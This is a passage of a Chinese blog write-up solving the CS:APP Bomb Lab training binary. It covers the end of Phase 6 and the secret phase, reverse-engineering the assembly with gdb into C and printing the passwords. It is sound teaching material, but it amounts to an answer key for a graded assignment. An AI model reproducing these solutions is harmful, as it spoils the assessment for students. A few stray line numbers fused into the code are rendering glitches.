<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">123456789b</span>egin_node = *ptrs;                 <span class="comment">// begin_node in %rbx, ptrs in %rsp + 0x20</span></span><br><span class="line">next_pos   = ptrs + <span class="number">1</span>;              <span class="comment">// next_pos in %rax</span></span><br><span class="line">end_pos    = ptrs + <span class="number">6</span>;              <span class="comment">// end_pos in %rsi</span></span><br><span class="line"><span class="keyword">for</span> (cur_node = begin_node; next_pos != end_pos;</span><br><span class="line">     cur_node = next_node) &#123;        <span class="comment">// cur_node in %rcx</span></span><br><span class="line">    next_node       = *next_pos;    <span class="comment">// next_node in %rdx</span></span><br><span class="line">    *(cur_node + <span class="number">1</span>) = next_node;</span><br><span class="line">    ++next_pos;</span><br><span class="line">&#125;c</span><br></pre></td></tr></table></figure>
<p>可见，这段代码的作用为按<strong>在栈中地址由低到高顺序</strong>遍历链表的 6 个结点，将它们串联起来。</p>
<p>这里的 <code>*(cur_node + 1)</code> 实质上就是 <code>cur_node-&gt;next</code>（即 <code>(*cur_node).next</code>），因为链表中的结点其实是一个结构体（struct），结点所在的地址指向的是数据 <code>val</code>，加上 <code>0x8</code> 后指向的也就是指针 <code>next</code>。此处将该指针 <code>next</code> 指向了下一个结点。</p>
<h5 id="626-第六部分4011da-~-401203"><a class="markdownIt-Anchor" href="#626-第六部分4011da-~-401203"></a> 6.2.6 第六部分（4011da ~ 401203）</h5>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">4011da:   bd 05 00 00 00          mov    $0x5,%ebp</span><br><span class="line">4011df:   48 8b 43 08             mov    0x8(%rbx),%rax</span><br><span class="line">4011e3:   8b 00                   mov    (%rax),%eax</span><br><span class="line">4011e5:   39 03                   cmp    %eax,(%rbx)</span><br><span class="line">4011e7:   7d 05                   jge    4011ee &lt;phase_6+0xfa&gt;</span><br><span class="line">4011e9:   e8 4c 02 00 00          callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">4011ee:   48 8b 5b 08             mov    0x8(%rbx),%rbx</span><br><span class="line">4011f2:   83 ed 01                sub    $0x1,%ebp</span><br><span class="line">4011f5:   75 e8                   jne    4011df &lt;phase_6+0xeb&gt;</span><br><span class="line">4011f7:   48 83 c4 50             add    $0x50,%rsp</span><br><span class="line">4011fb:   5b                      pop    %rbx</span><br><span class="line">4011fc:   5d                      pop    %rbp</span><br><span class="line">4011fd:   41 5c                   pop    %r12</span><br><span class="line">4011ff:   41 5d                   pop    %r13</span><br><span class="line">401201:   41 5e                   pop    %r14</span><br><span class="line">401203:   c3                      retq</span><br></pre></td></tr></table></figure>
<p>试译成 C 语言代码（经整理及部分改写）：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"> <span class="number">12345678f</span><span class="keyword">or</span> (i = <span class="number">5</span>; i != <span class="number">0</span>; --i) &#123;          <span class="comment">// i in %ebp</span></span><br><span class="line">    next_node = *(cur_node + <span class="number">1</span>);    <span class="comment">// next_node in %rax, cur_node in %rbx</span></span><br><span class="line">    next_num  = *next_node;         <span class="comment">// next_num in %eax</span></span><br><span class="line">    <span class="keyword">if</span> (*cur_node &lt; next_num)</span><br><span class="line">        explode_bomb();</span><br><span class="line">    cur_node = *(cur_node + <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> next_node;</span><br></pre></td></tr></table></figure>
<p>由上一节的分析，<code>*cur_node</code> 即 <code>cur_node-&gt;val</code>，<code>*(cur_node + 1)</code> 即 <code>cur_node-&gt;next</code>。通过这段代码，可以发现链表各个结点的数据 <code>val</code> 需要是顺序递减的。</p>
<p>以 1 号结点 <code>node1</code> 为例，使用 gdb 查看其数据 <code>val</code>：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(gdb) x&#x2F;d 0x6032d0</span><br></pre></td></tr></table></figure>
<p>输出信息：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0x6032d0 &lt;node1&gt;:       332</span><br></pre></td></tr></table></figure>
<p>用同样的方式得到链表 6 个结点的数据：</p>
<blockquote>
<p>p_node1-&gt;val = 332<br>
p_node2-&gt;val = 168<br>
p_node3-&gt;val = 924<br>
p_node4-&gt;val = 691<br>
p_node5-&gt;val = 477<br>
p_node6-&gt;val = 443</p>
</blockquote>
<p>按递减顺序排列后，可见在栈中地址由低到高应当分别为 <code>3</code>, <code>4</code>, <code>5</code>, <code>6</code>, <code>1</code>, <code>2</code> 号结点。</p>
<h5 id="627-确定输入的-6-个整数"><a class="markdownIt-Anchor" href="#627-确定输入的-6-个整数"></a> 6.2.7 确定输入的 6 个整数</h5>
<p>由之前的分析，<code>nums[i]</code> 在第三部分的代码中被依次修改成了 <code>7 - nums[i]</code>，而修改后的值分别对应栈中结点的标号 <code>3</code>, <code>4</code>, <code>5</code>, <code>6</code>, <code>1</code>, <code>2</code>。</p>
<p>因此，最开始输入的 6 个整数也就是 <code>4</code>, <code>3</code>, <code>2</code>, <code>1</code>, <code>6</code>, <code>5</code>，本关密码即为 <code>4 3 2 1 6 5</code>。</p>
<h5 id="628-测试"><a class="markdownIt-Anchor" href="#628-测试"></a> 6.2.8 测试</h5>
<p>在 gdb 中输入 Phase 6 的密码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">4 3 2 1 6 5</span><br></pre></td></tr></table></figure>
<p>输出信息：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Congratulations! You&#39;ve defused the bomb!</span><br></pre></td></tr></table></figure>
<h3 id="7-结束了吗"><a class="markdownIt-Anchor" href="#7-结束了吗"></a> 7. 结束了吗</h3>
<p>在 bomb.c 文件的最后，留下了这样一句耐人寻味的话：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;* Wow, they got it!  But isn&#39;t something... missing?  Perhaps</span><br><span class="line"> * something they overlooked?  Mua ha ha ha ha! *&#x2F;</span><br></pre></td></tr></table></figure>
<p>这是因为，本 Lab 还有一个隐藏关！</p>
<h3 id="8-secret-phase"><a class="markdownIt-Anchor" href="#8-secret-phase"></a> 8. Secret phase</h3>
<h4 id="81-本关密码"><a class="markdownIt-Anchor" href="#81-本关密码"></a> 8.1 本关密码</h4>
<h5 id="811-开启隐藏关的方法"><a class="markdownIt-Anchor" href="#811-开启隐藏关的方法"></a> 8.1.1 开启隐藏关的方法</h5>
<p>在 Phase 4 输入的 2 个整数后再额外输入 1 个字符串 <code>DrEvil</code>，比如将输入的字符串修改为 <code>7 0 DrEvil</code>，其余环节不变。</p>
<h5 id="812-隐藏关的密码"><a class="markdownIt-Anchor" href="#812-隐藏关的密码"></a> 8.1.2 隐藏关的密码</h5>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">22, 20</span><br></pre></td></tr></table></figure>
<h4 id="82-解题过程"><a class="markdownIt-Anchor" href="#82-解题过程"></a> 8.2 解题过程</h4>
<h5 id="820-找到隐藏函数"><a class="markdownIt-Anchor" href="#820-找到隐藏函数"></a> 8.2.0 找到隐藏函数</h5>
<p>好吧，实际上在 bomb.asm 中稍微往下翻翻就能找到一个名为 <code>secret_phase</code> 的函数。顾名思义，这应该就是隐藏关所对应的函数。</p>
<h5 id="821-找到开启隐藏关的方法"><a class="markdownIt-Anchor" href="#821-找到开启隐藏关的方法"></a> 8.2.1 找到开启隐藏关的方法</h5>
<p>事实上，前 6 关通过后，程序就自动终止了。那么应该如何进入这个隐藏关呢？</p>
<p>在 bomb.asm 搜索关键词 <code>secret_phase</code>，可以发现在函数 <code>phase_defused</code> 中出现了调用函数 <code>secret_phase</code> 的语句 401630: <code>callq 401242</code>。其中函数 <code>phase_defused</code> 就是每关通过后都会调用的函数。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">004015c4 &lt;phase_defused&gt;:</span><br><span class="line">  4015c4:   48 83 ec 78             sub    $0x78,%rsp</span><br><span class="line">  4015c8:   64 48 8b 04 25 28 00    mov    %fs:0x28,%rax</span><br><span class="line">  4015cf:   00 00</span><br><span class="line">  4015d1:   48 89 44 24 68          mov    %rax,0x68(%rsp)</span><br><span class="line">  4015d6:   31 c0                   xor    %eax,%eax</span><br><span class="line">  4015d8:   83 3d 81 21 20 00 06    cmpl   $0x6,0x202181(%rip)        # 603760 &lt;num_input_strings&gt;</span><br><span class="line">  4015df:   75 5e                   jne    40163f &lt;phase_defused+0x7b&gt;</span><br><span class="line">  4015e1:   4c 8d 44 24 10          lea    0x10(%rsp),%r8</span><br><span class="line">  4015e6:   48 8d 4c 24 0c          lea    0xc(%rsp),%rcx</span><br><span class="line">  4015eb:   48 8d 54 24 08          lea    0x8(%rsp),%rdx</span><br><span class="line">  4015f0:   be 19 26 40 00          mov    $0x402619,%esi</span><br><span class="line">  4015f5:   bf 70 38 60 00          mov    $0x603870,%edi</span><br><span class="line">  4015fa:   e8 f1 f5 ff ff          callq  400bf0 &lt;__isoc99_sscanf@plt&gt;</span><br><span class="line">  4015ff:   83 f8 03                cmp    $0x3,%eax</span><br><span class="line">  401602:   75 31                   jne    401635 &lt;phase_defused+0x71&gt;</span><br><span class="line">  401604:   be 22 26 40 00          mov    $0x402622,%esi</span><br><span class="line">  401609:   48 8d 7c 24 10          lea    0x10(%rsp),%rdi</span><br><span class="line">  40160e:   e8 25 fd ff ff          callq  401338 &lt;strings_not_equal&gt;</span><br><span class="line">  401613:   85 c0                   test   %eax,%eax</span><br><span class="line">  401615:   75 1e                   jne    401635 &lt;phase_defused+0x71&gt;</span><br><span class="line">  401617:   bf f8 24 40 00          mov    $0x4024f8,%edi</span><br><span class="line">  40161c:   e8 ef f4 ff ff          callq  400b10 &lt;puts@plt&gt;</span><br><span class="line">  401621:   bf 20 25 40 00          mov    $0x402520,%edi</span><br><span class="line">  401626:   e8 e5 f4 ff ff          callq  400b10 &lt;puts@plt&gt;</span><br><span class="line">  40162b:   b8 00 00 00 00          mov    $0x0,%eax</span><br><span class="line">  401630:   e8 0d fc ff ff          callq  401242 &lt;secret_phase&gt;</span><br><span class="line">  401635:   bf 58 25 40 00          mov    $0x402558,%edi</span><br><span class="line">  40163a:   e8 d1 f4 ff ff          callq  400b10 &lt;puts@plt&gt;</span><br><span class="line">  40163f:   48 8b 44 24 68          mov    0x68(%rsp),%rax</span><br><span class="line">  401644:   64 48 33 04 25 28 00    xor    %fs:0x28,%rax</span><br><span class="line">  40164b:   00 00</span><br><span class="line">  40164d:   74 05                   je     401654 &lt;phase_defused+0x90&gt;</span><br><span class="line">  40164f:   e8 dc f4 ff ff          callq  400b30 &lt;__stack_chk_fail@plt&gt;</span><br><span class="line">  401654:   48 83 c4 78             add    $0x78,%rsp</span><br><span class="line">  401658:   c3                      retq</span><br><span class="line">  401659:   90                      nop</span><br><span class="line">  40165a:   90                      nop</span><br><span class="line">  40165b:   90                      nop</span><br><span class="line">  40165c:   90                      nop</span><br><span class="line">  40165d:   90                      nop</span><br><span class="line">  40165e:   90                      nop</span><br><span class="line">  40165f:   90                      nop</span><br></pre></td></tr></table></figure>
<p>注意到以下片段：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">4015d6:   31 c0                   xor    %eax,%eax</span><br><span class="line">4015d8:   83 3d 81 21 20 00 06    cmpl   $0x6,0x202181(%rip)        # 603760 &lt;num_input_strings&gt;</span><br><span class="line">4015df:   75 5e                   jne    40163f &lt;phase_defused+0x7b&gt;</span><br><span class="line">...</span><br><span class="line">40163f:   48 8b 44 24 68          mov    0x68(%rsp),%rax</span><br><span class="line">401644:   64 48 33 04 25 28 00    xor    %fs:0x28,%rax</span><br><span class="line">40164b:   00 00</span><br><span class="line">40164d:   74 05                   je     401654 &lt;phase_defused+0x90&gt;</span><br><span class="line">40164f:   e8 dc f4 ff ff          callq  400b30 &lt;__stack_chk_fail@plt&gt;</span><br><span class="line">401654:   48 83 c4 78             add    $0x78,%rsp</span><br><span class="line">401658:   c3                      retq</span><br><span class="line">401659:   90                      nop</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>4015d6: <code>xor %eax,%eax</code> 将 %eax 寄存器设置为 <code>0</code>。</p>
<p>4015d8: <code>cmpl $0x6,0x202181(%rip)</code> 和 4015df: <code>jne 40163f</code> 判断 <code>0x202181(%rip)</code> 的值是否为 <code>6</code>，是则继续执行之后的语句，否则直接跳到 40163f: <code>mov 0x68(%rsp),%rax</code> 返回（这一段详见 5.2.1 节关于 stack canary 的阐述）。</p>
<p><code>0x202181(%rip)</code> 也就是 <code>(0x603760)</code> 存放的是什么？通过 gdb 发现，这个值的初始值为 <code>0</code>，而每通过一关后，这个值便加 <code>1</code>。结合注释（即变量名）<code># 603760</code>，推测它表示输入过的字符串数量，实际上也就是通过的关卡数量。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(gdb) x&#x2F;d 0x603760</span><br><span class="line">0x603760 &lt;num_input_strings&gt;:   0</span><br><span class="line">(gdb) b phase_1</span><br><span class="line">Breakpoint 2 at 0x400ee0</span><br><span class="line">(gdb) b phase_2</span><br><span class="line">Breakpoint 3 at 0x400efc</span><br><span class="line">(gdb) r</span><br><span class="line">Starting program: &#x2F;root&#x2F;Hakula&#x2F;csapp&#x2F;lab2&#x2F;bomb</span><br><span class="line">Welcome to my fiendish little bomb. You have 6 phases with</span><br><span class="line">which to blow yourself up. Have a nice day!</span><br><span class="line">Border relations with Canada have never been better.</span><br><span class="line"></span><br><span class="line">Breakpoint 2, 0x0000000000400ee0 in phase_1 ()</span><br><span class="line">(gdb) x&#x2F;d 0x603760</span><br><span class="line">0x603760 &lt;num_input_strings&gt;:   1</span><br><span class="line">(gdb) c</span><br><span class="line">Continuing.</span><br><span class="line">Phase 1 defused. How about the next one?</span><br><span class="line">1 2 4 8 16 32</span><br><span class="line"></span><br><span class="line">Breakpoint 3, 0x0000000000400efc in phase_2 ()</span><br><span class="line">(gdb) x&#x2F;d 0x603760</span><br><span class="line">0x603760 &lt;num_input_strings&gt;:   2</span><br><span class="line">(gdb)</span><br></pre></td></tr></table></figure>
<p>判断这个值是否为 <code>6</code>，也就是判断是否通过了全部 6 个关卡。因此这个隐藏关只有在 6 个关卡都顺利通过后才会开启。</p>
<p>剩下的片段也就是本函数与隐藏关相关的主体部分。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">4015e1:   4c 8d 44 24 10          lea    0x10(%rsp),%r8</span><br><span class="line">4015e6:   48 8d 4c 24 0c          lea    0xc(%rsp),%rcx</span><br><span class="line">4015eb:   48 8d 54 24 08          lea    0x8(%rsp),%rdx</span><br><span class="line">4015f0:   be 19 26 40 00          mov    $0x402619,%esi</span><br><span class="line">4015f5:   bf 70 38 60 00          mov    $0x603870,%edi</span><br><span class="line">4015fa:   e8 f1 f5 ff ff          callq  400bf0 &lt;__isoc99_sscanf@plt&gt;</span><br></pre></td></tr></table></figure>
<p>这段代码我们已经十分熟悉。<code>0x402619</code> 指向的应该是一个格式化字符串。使用 gdb 查看地址 <code>0x402619</code> 存放的内容：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(gdb) x&#x2F;s 0x402619</span><br></pre></td></tr></table></figure>
<p>输出信息：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0x402619:       &quot;%d %d %s&quot;</span><br></pre></td></tr></table></figure>
<p>因此，在某处我们需要按这个格式输入 2 个整数和 1 个字符串。这 2 个整数将被保存在 <code>0x8(%rsp)</code> 和 <code>0xc(%rsp)</code> 中，字符串将被保存在 <code>0x10(%rsp)</code> 中。需要注意的是这里还额外传入了一个地址 <code>0x603870</code>，根据我对系统函数 <code>sscanf</code> 的理解，这应当指的是那个被用来解析的字符串的地址。</p>
<p>读取完毕后，栈内保存的信息为：</p>
<blockquote>
<p>0x8(%rsp) = nums[0]<br>
0xc(%rsp) = nums[1]<br>
0x10(%rsp) = password</p>
</blockquote>
<p>其中，<code>nums[0]</code> 和 <code>nums[1]</code> 表示 <code>0x603870</code> 指向的字符串中解析得到的（前）2 个整数，<code>password</code> 表示之后解析得到的（前）1 个字符串。</p>
<p>在函数 <code>phase_defused</code> 的入口处设置一个断点。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(gdb) b phase_defused</span><br></pre></td></tr></table></figure>
<p>每通过一个关卡后，使用 gdb 查看地址 <code>0x603870</code> 存放的内容：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(gdb) x&#x2F;s 0x603870</span><br></pre></td></tr></table></figure>
<p>发现在通过 Phase 4 后，输出信息产生了变化：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0x603870 &lt;input_strings+240&gt;:   &quot;7 0&quot;</span><br></pre></td></tr></table></figure>
<p>可见，<code>0x603870</code> 指向的是 Phase 4 中输入的字符串 <code>7 0</code>。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">4015ff:   83 f8 03                cmp    $0x3,%eax</span><br><span class="line">401602:   75 31                   jne    401635 &lt;phase_defused+0x71&gt;</span><br><span class="line">...</span><br><span class="line">401630:   e8 0d fc ff ff          callq  401242 &lt;secret_phase&gt;</span><br><span class="line">401635:   bf 58 25 40 00          mov    $0x402558,%edi</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>4015ff: <code>cmp $0x3,%eax</code> 和 401602: <code>jne 401635</code> 判断函数 <code>sscanf</code> 的返回值是否为 <code>3</code>，是则继续执行之后的语句，否则直接跳到 401635: <code>mov $0x402558,%edi</code>，也就是跳过了隐藏关。</p>
<p>于是我们知道，在 Phase 4 中除了需要输入作为密码的 2 个整数外，还需要再额外输入 1 个字符串。这是开启隐藏关的前提条件。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">401604:   be 22 26 40 00          mov    $0x402622,%esi</span><br><span class="line">401609:   48 8d 7c 24 10          lea    0x10(%rsp),%rdi</span><br><span class="line">40160e:   e8 25 fd ff ff          callq  401338 &lt;strings_not_equal&gt;</span><br><span class="line">401613:   85 c0                   test   %eax,%eax</span><br><span class="line">401615:   75 1e                   jne    401635 &lt;phase_defused+0x71&gt;</span><br><span class="line">...</span><br><span class="line">401630:   e8 0d fc ff ff          callq  401242 &lt;secret_phase&gt;</span><br><span class="line">401635:   bf 58 25 40 00          mov    $0x402558,%edi</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<blockquote>
<p>%rdi = 0x10(%rsp) = password<br>
%esi = 0x402622</p>
</blockquote>
<p>这段代码我们也已经十分熟悉。<code>0x402622</code> 指向的应该是一个字符串。使用 gdb 查看地址 <code>0x402622</code> 存放的内容：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(gdb) x&#x2F;s 0x402622</span><br></pre></td></tr></table></figure>
<p>输出信息：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0x402622:       &quot;DrEvil&quot;</span><br></pre></td></tr></table></figure>
<p>此后，函数 <code>strings_not_equal</code> 检查 %rdi 和 %rsi 寄存器指向的字符串是否相等，即 <code>password</code> 是否等于 <code>DrEvil</code>，是则返回 <code>0</code>，否则返回 <code>1</code>。</p>
<p>401613: <code>test %eax,%eax</code> 和 401615: <code>jne 401635</code> 判断函数 <code>strings_not_equal</code> 的返回值是否为 <code>0</code>，是则继续执行之后的语句，否则直接跳到 401635: <code>mov $0x402558,%edi</code>，也就是跳过了隐藏关。</p>
<p>因此，在 Phase 4 中需要额外输入的 1 个字符串就是 <code>DrEvil</code>。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">401617:   bf f8 24 40 00          mov    $0x4024f8,%edi</span><br><span class="line">  40161c:   e8 ef f4 ff ff          callq  400b10 &lt;puts@plt&gt;</span><br><span class="line">  401621:   bf 20 25 40 00          mov    $0x402520,%edi</span><br><span class="line">  401626:   e8 e5 f4 ff ff          callq  400b10 &lt;puts@plt&gt;</span><br><span class="line">  40162b:   b8 00 00 00 00          mov    $0x0,%eax</span><br><span class="line">  401630:   e8 0d fc ff ff          callq  401242 &lt;secret_phase&gt;</span><br><span class="line">  401635:   bf 58 25 40 00          mov    $0x402558,%edi</span><br><span class="line">  40163a:   e8 d1 f4 ff ff          callq  400b10 &lt;puts@plt&gt;</span><br></pre></td></tr></table></figure>
<p>这段就是输出几行提示文本，待会儿我们可以直接看到。以及，调用函数 <code>secret_phase</code> 开启隐藏关。</p>
<h5 id="822-开启隐藏关"><a class="markdownIt-Anchor" href="#822-开启隐藏关"></a> 8.2.2 开启隐藏关</h5>
<p>运行到 Phase 4 时，在 gdb 中输入修改后的字符串：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">7 0 DrEvil</span><br></pre></td></tr></table></figure>
<p>继续跑完全部 6 个关卡，输出信息：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">12Curses, you&#39;ve found the secret phase!</span><br><span class="line">But finding it and solving it are quite different...</span><br></pre></td></tr></table></figure>
<h5 id="823-观察函数-secret_phase"><a class="markdownIt-Anchor" href="#823-观察函数-secret_phase"></a> 8.2.3 观察函数 secret_phase</h5>
<p>在 bomb.asm 中找到函数 <code>secret_phase</code> 对应的汇编语句：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;secret_phase&gt;:</span><br><span class="line">  401242:   53                      push   %rbx</span><br><span class="line">  401243:   e8 56 02 00 00          callq  40149e &lt;read_line&gt;</span><br><span class="line">  401248:   ba 0a 00 00 00          mov    $0xa,%edx</span><br><span class="line">  40124d:   be 00 00 00 00          mov    $0x0,%esi</span><br><span class="line">  401252:   48 89 c7                mov    %rax,%rdi</span><br><span class="line">  401255:   e8 76 f9 ff ff          callq  400bd0 &lt;strtol@plt&gt;</span><br><span class="line">  40125a:   48 89 c3                mov    %rax,%rbx</span><br><span class="line">  40125d:   8d 40 ff                lea    -0x1(%rax),%eax</span><br><span class="line">  401260:   3d e8 03 00 00          cmp    $0x3e8,%eax</span><br><span class="line">  401265:   76 05                   jbe    40126c &lt;secret_phase+0x2a&gt;</span><br><span class="line">  401267:   e8 ce 01 00 00          callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">  40126c:   89 de                   mov    %ebx,%esi</span><br><span class="line">  40126e:   bf f0 30 60 00          mov    $0x6030f0,%edi</span><br><span class="line">  401273:   e8 8c ff ff ff          callq  401204 &lt;fun7&gt;</span><br><span class="line">  401278:   83 f8 02                cmp    $0x2,%eax</span><br><span class="line">  40127b:   74 05                   je     401282 &lt;secret_phase+0x40&gt;</span><br><span class="line">  40127d:   e8 b8 01 00 00          callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">  401282:   bf 38 24 40 00          mov    $0x402438,%edi</span><br><span class="line">  401287:   e8 84 f8 ff ff          callq  400b10 &lt;puts@plt&gt;</span><br><span class="line">  40128c:   e8 33 03 00 00          callq  4015c4 &lt;phase_defused&gt;</span><br><span class="line">  401291:   5b                      pop    %rbx</span><br><span class="line">  401292:   c3                      retq</span><br><span class="line">  401293:   90                      nop</span><br><span class="line">  401294:   90                      nop</span><br><span class="line">  401295:   90                      nop</span><br><span class="line">  401296:   90                      nop</span><br><span class="line">  401297:   90                      nop</span><br><span class="line">  401298:   90                      nop</span><br><span class="line">  401299:   90                      nop</span><br><span class="line">  40129a:   90                      nop</span><br><span class="line">  40129b:   90                      nop</span><br><span class="line">  40129c:   90                      nop</span><br><span class="line">  40129d:   90                      nop</span><br><span class="line">  40129e:   90                      nop</span><br><span class="line">  40129f:   90                      nop</span><br></pre></td></tr></table></figure>
<p>401243: <code>callq 40149e</code> 调用函数 <code>read_line</code>，其返回值（即输入的一行字符串 <code>str</code>）保存在 %rax 寄存器。</p>
<blockquote>
<p>%rax = str</p>
</blockquote>
<p>401248: <code>mov $0xa,%edx</code> 和 40124d: <code>mov $0x0,%esi</code> 将 %edx 和 %esi 寄存器分别设置为 <code>10</code> 和 <code>0</code>。</p>
<blockquote>
<p>%esi = 0<br>
%edx = 10</p>
</blockquote>
<p>400e37: <code>mov %rax,%rdi</code> 将 %rax 寄存器保存的地址传给了 %rdi 寄存器。</p>
<blockquote>
<p>%rdi = %rax = str</p>
</blockquote>
<p>401255: <code>callq 400bd0</code> 调用系统函数 <code>strtol</code>。可以推测出这个函数的作用是将字符串转化为整数，但我对它的参数用法不是很了解。查阅资料得，传入的第 1 个参数 %rdi 是被用来解析的字符串的地址 <code>str</code>，第 2 个参数 %esi 是字符串中需要解析部分的结束地址（这里我们传入的是 <code>NULL</code>，表示不使用这个参数），第 3 个参数 %edx 是这个整数的底数（这里我们传入的是 <code>10</code>，表示十进制）[^7]。最后函数返回值保存在 %rax 寄存器中。</p>
<p>总之，这部分的作用就是读入一个多位的整数。</p>
<blockquote>
<p>%rax = num</p>
</blockquote>
<p>其中，<code>num</code> 表示输入的字符串解析得到的多位整数。</p>
<p>400e37: <code>mov %rax,%rbx</code> 和 40125d: <code>lea -0x1(%rax),%eax</code> 将 %rax 的值传给了 %rbx 寄存器，然后 %rax 的值减 1。</p>
<blockquote>
<p>%rbx = %rax = num<br>
%eax = %rax - 1 = num - 1</p>
</blockquote>
<p>401260: <code>cmp $0x3e8,%eax</code> 和 401265: <code>jbe 40126c</code> 判断 %eax 的值是否不超过 <code>0x3e8</code>，是则直接跳到 40126c: <code>mov %ebx,%esi</code>，否则执行 40143a: <code>callq 40143a</code> 引爆炸弹。</p>
<p>因此，输入的整数应当不超过 <code>1001</code>（无符号数）。</p>
<p>40126c: <code>mov %ebx,%esi</code> 和 40126e: <code>mov $0x6030f0,%edi</code> 将 %ebx 的值传给了 %esi 寄存器，将地址 <code>0x6030f0</code> 传给了 %edi 寄存器。</p>
<blockquote>
<p>%edi = 0x6030f0<br>
%esi = %ebx = num</p>
</blockquote>
<p>401273: <code>callq 401204</code> 调用函数 <code>fun7</code>，也就是本关的主体部分。</p>
<p>401278: <code>cmp $0x2,%eax</code> 和 40127b: <code>je 401282</code> 判断函数 <code>fun7</code> 的返回值是否为 <code>2</code>，是则直接跳到 401282: <code>mov $0x402438,%edi</code>，否则执行 40143a: <code>callq 40143a</code> 引爆炸弹。</p>
<p>因此，函数 <code>fun7</code> 的返回值应当为 <code>2</code>。</p>
<p>之后就是输出一行提示文本，以及一些收尾工作。</p>
<h5 id="824-观察函数-fun7"><a class="markdownIt-Anchor" href="#824-观察函数-fun7"></a> 8.2.4 观察函数 fun7</h5>
<p>在 bomb.asm 中找到函数 <code>fun7</code> 对应的汇编语句：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;fun7&gt;:</span><br><span class="line">  401204:   48 83 ec 08             sub    $0x8,%rsp</span><br><span class="line">  401208:   48 85 ff                test   %rdi,%rdi</span><br><span class="line">  40120b:   74 2b                   je     401238 &lt;fun7+0x34&gt;</span><br><span class="line">  40120d:   8b 17                   mov    (%rdi),%edx</span><br><span class="line">  40120f:   39 f2                   cmp    %esi,%edx</span><br><span class="line">  401211:   7e 0d                   jle    401220 &lt;fun7+0x1c&gt;</span><br><span class="line">  401213:   48 8b 7f 08             mov    0x8(%rdi),%rdi</span><br><span class="line">  401217:   e8 e8 ff ff ff          callq  401204 &lt;fun7&gt;</span><br><span class="line">  40121c:   01 c0                   add    %eax,%eax</span><br><span class="line">  40121e:   eb 1d                   jmp    40123d &lt;fun7+0x39&gt;</span><br><span class="line">  401220:   b8 00 00 00 00          mov    $0x0,%eax</span><br><span class="line">  401225:   39 f2                   cmp    %esi,%edx</span><br><span class="line">  401227:   74 14                   je     40123d &lt;fun7+0x39&gt;</span><br><span class="line">  401229:   48 8b 7f 10             mov    0x10(%rdi),%rdi</span><br><span class="line">  40122d:   e8 d2 ff ff ff          callq  401204 &lt;fun7&gt;</span><br><span class="line">  401232:   8d 44 00 01             lea    0x1(%rax,%rax,1),%eax</span><br><span class="line">  401236:   eb 05                   jmp    40123d &lt;fun7+0x39&gt;</span><br><span class="line">  401238:   b8 ff ff ff ff          mov    $0xffffffff,%eax</span><br><span class="line">  40123d:   48 83 c4 08             add    $0x8,%rsp</span><br><span class="line">  401241:   c3                      retq</span><br></pre></td></tr></table></figure>
<p>401217 和 40122d: <code>callq 401204</code> 都调用了函数 <code>fun7</code> 自身，可见这是一个递归函数。</p>
<p>试译成 C 语言代码：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// p_node in %rdi, target in %esi</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">fun7</span><span class="params">(<span class="keyword">int</span>* p_node, <span class="keyword">int</span> target)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (p_node == <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0xffffffff</span>;</span><br><span class="line">    cur_num = *p_node;                          <span class="comment">// cur_num in %edx</span></span><br><span class="line">    <span class="keyword">if</span> (cur_num &gt; target) &#123;</span><br><span class="line">        p_node = *(p_node + <span class="number">1</span>);</span><br><span class="line">        result = fun7(p_node, target);          <span class="comment">// result in %eax</span></span><br><span class="line">        <span class="keyword">return</span> result * <span class="number">2</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (cur_num == target) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;                                    <span class="comment">// cur_num &lt; target</span></span><br><span class="line">        result = <span class="number">0</span>;</span><br><span class="line">        p_node = *(p_node + <span class="number">2</span>);</span><br><span class="line">        result = fun7(p_node, target);</span><br><span class="line">        <span class="keyword">return</span> result * <span class="number">2</span> + <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>如此这个递归函数的作用就很清晰了。</p>
